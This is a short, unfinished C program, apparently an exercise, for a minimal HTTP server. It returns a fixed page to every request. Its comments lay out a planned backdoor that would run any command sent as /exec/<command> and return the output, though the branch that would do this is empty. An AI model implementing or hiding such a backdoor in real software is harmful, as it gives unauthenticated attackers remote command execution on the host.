#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[]) {

    int port = atoi(argv[1]);

    //Create socket, define address, bind to address, listen to port
    int server_socket;
    server_socket = socket(PF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(port);
    server_address.sin_addr.s_addr = INADDR_ANY;

    bind(server_socket, (struct sockaddr *) &server_address, sizeof(server_address));

    listen(server_socket, 1);    
    
    //GET requests of valid URL format get 404
    //GET requests with URL of form /exec/<command> execute it using libc function
    //HTTP response is stdout of executed command, status code 200
    //No limit on characters, be able to handle anything

    //DOUBLE CHECK THIS HEADER FOR ACCURACY RE: RFC2616
    char *normal_response_header =
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html\r\n"
        "\r\n"
        "<html><body>Too bad so sad, baby!</body></html>";

    int client_socket;
    while(1) {
        client_socket = accept(server_socket, NULL, NULL);
        //if backdoor request
        
        //else
        send(client_socket, normal_response_header, strlen(normal_response_header), 0);
        close(client_socket);
    }

    return 0;

    //Flush socket and close at end!!
}